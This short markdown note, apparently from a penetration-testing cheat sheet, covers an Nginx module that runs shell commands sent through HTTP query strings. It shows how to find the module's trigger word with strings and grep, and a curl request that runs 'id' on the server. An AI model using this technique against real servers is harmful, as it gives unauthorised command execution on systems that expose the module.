# Nginx web server command execution module

## Github repo: https://github.com/limithit/NginxExecute

### Requirements: In the nginx configuration file, find (Command: on)

#### 1) Find the variable that runs commands on the server

    strings /usr/share/nginx/modules/NAME_OF_THE_MODULE.so | grep run 

### Usage: 

    curl -s -g "http://localhost:8000/?system.run[id]"

